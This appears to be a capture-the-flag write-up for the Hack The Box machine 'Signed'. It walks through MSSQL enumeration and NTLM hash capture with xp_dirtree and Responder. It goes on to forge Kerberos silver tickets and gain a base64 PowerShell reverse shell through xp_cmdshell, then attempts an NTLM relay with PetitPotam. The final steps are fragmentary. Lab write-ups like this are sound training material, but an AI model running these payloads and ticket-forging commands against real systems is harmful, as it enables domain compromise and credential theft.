- - - 
created : 11-10-2025 

Tags : #medium 

Released on 11 Oct 2025 (Season 9)
- - - 
# Machine Information

As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the **MSSQL** service: 

`scott / Sm230#C5NatH`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ rustscan -a signed.htb -- -A

Open 10.10.11.90:1433

PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption

 ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-10-11T19:10:03+00:00; +22s from scanner time.
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

We have `mssql 2022` and nothing else so we just know what's the way in there.

Let's add `dc01.darkzero.htb` to our `/etc/hosts` file. 
# Enumeration

This is an useful link to read about the process on pentesting mssql and to understand:

https://www.bordergate.co.uk/attacking-mssql/
## MSSQL

We can start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) checking logging in `mssql` for the given user, using `nxc` module:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ nxc mssql signed.htb -u scott -p 'Sm230#C5NatH'          
MSSQL       10.10.11.90     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:SIGNED.HTB)
MSSQL       10.10.11.90     1433   DC01             [-] SIGNED.HTB\scott:Sm230#C5NatH (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
```

Now we know the login works, so we can use `impacket` module for `mssql` and get a shell:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ impacket-mssqlclient scott:'Sm230#C5NatH'@signed.htb   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)> enum_db                             # This command let's us know what databases are there
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1   

SQL (scott  guest@master)> enum_links                         # This command let's us know if external links are communicating with the mssql server
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      

Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (scott  guest@master)> enable_xp_cmdshell                 # Whith this command we try to enable xp_cmdshell which can let you execute commands through sql server
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

We don't have enough privileges to enable it.

This SQL command can be used for listing users:

```bash
> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
> 
login                                     login_type                 password_hash   create_date   modify_date   status     
---------------------------------------   ------------------------   -------------   -----------   -----------   --------   
##MS_AgentSigningCertificate##            CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:32:07   2022-10-08 06:32:07   b'Enabled'   

##MS_PolicyEventProcessingLogin##         SQL_LOGIN                           NULL   2022-10-08 06:32:02   2025-10-02 09:27:32   b'Disabled'   

##MS_PolicySigningCertificate##           CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:30:40   2022-10-08 06:30:40   b'Enabled'   

##MS_PolicyTsqlExecutionLogin##           SQL_LOGIN                           NULL   2022-10-08 06:32:02   2025-10-02 09:27:32   b'Disabled'   

##MS_SmoExtendedSigningCertificate##      CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:30:40   2022-10-08 06:30:40   b'Enabled'   

##MS_SQLAuthenticatorCertificate##        CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:30:40   2022-10-08 06:30:40   b'Enabled'   

##MS_SQLReplicationSigningCertificate##   CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:30:40   2022-10-08 06:30:40   b'Enabled'   

##MS_SQLResourceSigningCertificate##      CERTIFICATE_MAPPED_LOGIN            NULL   2022-10-08 06:30:40   2022-10-08 06:30:40   b'Enabled'   

NT AUTHORITY\SYSTEM                       WINDOWS_LOGIN                       NULL   2025-10-02 09:27:32   2025-10-02 09:27:32   b'Enabled'   

NT SERVICE\MSSQLSERVER                    WINDOWS_LOGIN                       NULL   2025-10-02 09:27:32   2025-10-02 09:27:32   b'Enabled'   

NT SERVICE\SQLSERVERAGENT                 WINDOWS_LOGIN                       NULL   2025-10-02 09:27:32   2025-10-02 09:27:32   b'Enabled'   

NT SERVICE\SQLTELEMETRY                   WINDOWS_LOGIN                       NULL   2025-10-02 09:27:33   2025-10-02 09:27:33   b'Enabled'   

NT SERVICE\SQLWriter                      WINDOWS_LOGIN                       NULL   2025-10-02 09:27:32   2025-10-02 09:27:32   b'Enabled'   

NT SERVICE\Winmgmt                        WINDOWS_LOGIN                       NULL   2025-10-02 09:27:32   2025-10-02 09:27:32   b'Enabled'   

sa                                        SQL_LOGIN                           NULL   2003-04-08 09:10:35   2025-10-11 12:44:25   b'Enabled'   

scott                                     SQL_LOGIN                           NULL   2025-10-02 09:33:29   2025-10-11 12:36:59   b'Enabled'   
```
## Exploit - Lateral Movement

## Scott to mssqlsvc

**STEAL NTLM** 

**xp_dirtree** is a stored procedure that allows you to query the filesystem. By pointing it at a `UNC` path running responder.py, we can capture the Net-NTLM hash of the service account.

```bash
SQL (scott  guest@tempdb)> exec master..xp_dirtree '\\10.10.14.86\test'
subdirectory   depth   
------------   -----   
```

 Start [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) listener with [Responder](../Starting%20Point/Tier%201/Responder.md) tool before the exec command (tun0 is for VPN_IP):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ sudo responder -I tun0    

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:243cb59b7e22ab81:0CD24409EF9C2B135A992F92CF1494B2:HTB{REDACTED_HASH} 
```

Crack the hash using [JohnTheRipper](../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) (auto-detected):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
HTB{REDACTED_PASSWD}     (mssqlsvc)     
1g 0:00:00:00 DONE (2025-10-11 21:29) 1.123g/s 5046Kp/s 5046Kc/s 5046KC/s purcitititya..punkgod666
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Now we have a password for the `mssqlsvc`account.

Windows login is enabled for the user so we try to access `mssql` again (i had to add `-windows-auth` you maybe don't have to so try both methods if it's not working):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ impacket-mssqlclient mssqlsvc:'REDACTED_PASSWD'@signed.htb -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

<SNIP>
SQL (SIGNED\mssqlsvc  guest@master)> enum_db
```

Now we check again and we still can't enable or use `xp_cmdshell` command:

```bash
SQL (SIGNED\mssqlsvc  guest@master)> sp_configure     # This command let us know which functions are enabled on the server

xp_cmdshell                                    0            1              1            1 
```

Another useful link to read about :  https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html

Checking permissions with this command for the current user:

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
entity_name   subentity_name   permission_name                             
-----------   --------------   -----------------------------------------   
database                       CONNECT                                     

database                       VIEW ANY COLUMN ENCRYPTION KEY DEFINITION   

database                       VIEW ANY COLUMN MASTER KEY DEFINITION       

database                       VIEW SECURITY DEFINITION                    

database                       VIEW PERFORMANCE DEFINITION                 

database                       VIEW DEFINITION 

SQL (SIGNED\mssqlsvc  guest@master)> EXEC sp_helprotect 'xp_cmdshell'  ## Users that can run xp_cmdshell
ERROR(DC01): Line 291: There are no matching rows on which to report.
```

We can use this `xp_dirtree` command to access directories on system to list them out:

```bash
SQL (SIGNED\mssqlsvc  guest@master)> EXEC MASTER.sys.xp_dirtree 'C:\Users\', 1, 1
subdirectory    depth   file   
-------------   -----   ----   
Administrator       1      0   

All Users           1      0   

Default             1      0   

Default User        1      0   

mssqlsvc            1      0   

Public              1      0 


SQL (SIGNED\mssqlsvc  guest@master)> EXEC MASTER.sys.xp_dirtree 'C:\Users\mssqlsvc\Desktop', 1, 1subdirectory   depth   file   
------------   -----   ----   
user.txt           1      1  
```

We can see the flag here but we can't read it, we have to escalate our privileges for that.

With this SQL command we can enumerate the DBs owners:

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT suser_sname(owner_sid) FROM sys.databases

sa                

sa   

sa   

sa   
```

With this SQL command we check if we can impersonate another user:

```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

No !! We can't because we don't have that much privileges.
##  mssqlsvc to IT

If you have the NTLM hash (or AES key) of a SQL service account (e.g., sqlsvc) you can forge a `TGS` for the MSSQL SPN and impersonate any user to the SQL service. 
From there, enable `xp_cmdshell` to execute commands as the SQL service account. If that token has `SeImpersonatePrivilege`, chain a Potato to elevate to `SYSTEM`.

We can get the domain `SID` for `IT` group:

```bash
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\IT');
                                                                                                       
-----------------------------------------------------------                                            
   'HTB{REDACTED_HASH}'  
```

That's not Active Directory format so we have to convert it to `AD SID`:

```bash
S-1-5-21-4088429403-1159899800-2753317549
```

You can do it with the `Powershell` command to Convert Hex SID to S-Strings:

```bash
$hex = "HTB{REDACTED_HASH}" [System.Security.Principal.SecurityIdentifier]::new([byte[]]@(for($i=0;$i -lt $hex.Length;$i+=2){ [Convert]::ToByte($hex.Substring($i,2),16) }),0).Value
```

This [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) script allow us to convert password to hash (mssqlsvc passwd), we need it because of the `impacket-ticketer` command `(-nthash`):

```python
python -c "import hashlib; print(hashlib.new('md4','password'.encode('utf-16le')).hexdigest())"
```

Now we can craft a `TGT` for `Administrator` using the service `mssqlsvc` account:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ impacket-ticketer -nthash 'HTB{REDACTED_HASH}' -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
```

Login as `Administrator` and enable `xp_cmdshell` finally:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ impacket-mssqlclient -no-pass -k signed.htb/Administrator@dc01.signed.htb  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\Administrator  dbo@master)> 

SQL (SIGNED\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```
## Reverse Shell

Now that we enabled that and have the right permissions we use `xp_cmdshell` and gain a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md): https://www.revshells.com/ (Windows base64)

This is the full command, replace `base64` text with your shell [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md):
```bash
xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAA2ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Set the listener with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) before, and enter the revshell command:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/user]
└─$ nc -lvnp 1337 
listening on [any] 1337 ...
connect to [10.10.14.86] from (UNKNOWN) [10.10.11.90] 56410
dir
PS C:\Users\mssqlsvc\Desktop> type user.txt
    HTB{REDACTED_PASSWD}
```
# Root
## Special Ticket - Unintended PATH

Now we can request a special ticket for `mssqlsvc` with `OPENROWSET`and `BULK` use permissions enabled (these are interesting functions in `mssql` which gives us the ability to read files other than list it),
to be able to do that we have to add at the previous command the groups n `512,519`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/root]
└─$ impacket-ticketer -nthash HTB{REDACTED_HASH} -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,519,1105 -user-id 1103 mssqlsvc

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
zsh: unknown file attribute: B

└─$ export KRB5CCNAME=/home/mdn0x/HTB/Machines/Signed/root/mssqlsvc.ccache
```

And we can read the root flag:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/root]
└─$ impacket-mssqlclient -no-pass -k signed.htb/mssqlsvc@dc01.signed.htb

SQL (SIGNED\mssqlsvc  dbo@master)> SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS pwned;
BulkColumn                                
---------------------------------------   
b'HTB{REDACTED_FLAG}\r\n' 
```

Pwned !! 

This is the fastest method to root the box but not the only one neither the intended way to that, so now we are going to explore and study the intended path.
## CVE-2025-33073 Intended PATH

After I confirmed this wasn't the intended way (pretty obvious too),  since the box's name is Signed I've been trying to use CVE-2025-33073, but no luck since [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) is signed on the machine.

It's a special type of NTLM relay with which you can trick the DC to authenticate to you by making it think it is authenticating to itself, then you relay the authentication to any protocol except smb, not smb since signing is enabled.

Read about about vulnerability: [Link](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)

So we can basically relay the authentication to `winrms` and dump password hashes.

And i also found this, take a look at this PR: [Link 2](https://github.com/fortra/impacket/pull/1947](https://github.com/fortra/impacket/pull/1947 "https://github.com/fortra/impacket/pull/1947")

Make sure to get the latest `impacket` directly from [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md). I've also found this while working on issues: [Link 3](https://sensepost.com/blog/2025/is-tls-more-secure-the-winrms-case)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/root]
└─$ git clone https://github.com/fortra/impacket.git   
Clone in 'impacket' in corso...
remote: Enumerating objects: 25121, done.
remote: Counting objects: 100% (201/201), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 25121 (delta 139), reused 73 (delta 73), pack-reused 24920 (from 3)

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Signed/root]
└─$ cd impacket 

┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Signed/root/impacket]
└─$ python3 -m pipx install .
```

Read this for more info: [Link 4](https://www.secureauth.com/resources/we-love-relaying-credentials-a-technical-guide-to-relaying-credentials-everywhere/)
## Petitpotam Attack

First we register the `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` DNS record and made it point to our IP address. This format can be used to coerce machines into authenticating via Kerberos to a controlled IP address (ours):

```bash
dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'HTB{REDACTED_PASSWD}' 10.10.11.90 -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.14.156
```

Then we use  `ntlmrelayx.py`:

```bash
ntlmrelayx.py -t winrms://10.10.11.90 -smb2support
```

PetitPotam coerces a `SYSTEM` service (lsass.exe) into authenticating to a controlled machine, therefore a machine account authentication is received. As the authentication originates from the same machine, the relay fails.

`petitpotam` and `ntlm relay` go hand in hand here because there's no other way of coercion in this case (except printer bug or petitpotam):

```bash
─$ git clone https://github.com/topotam/PetitPotam.git

─$ cd PetitPotam
─$ chmod +x PetitPotam.py 
```

```bash
python3 PetitPotam.py -u mssqlsvc -p 'HTB{REDACTED_PASSWD}' -d signed.htb 10.10.11.90 DC01.SIGNED.HTB
```

You can use `nxc` to trigger it:

```
nxc smb 
```

Now we have the `Administrator` NLTM hash and we can do a pass-the-hash attack.

`printerbug` works fine too for this.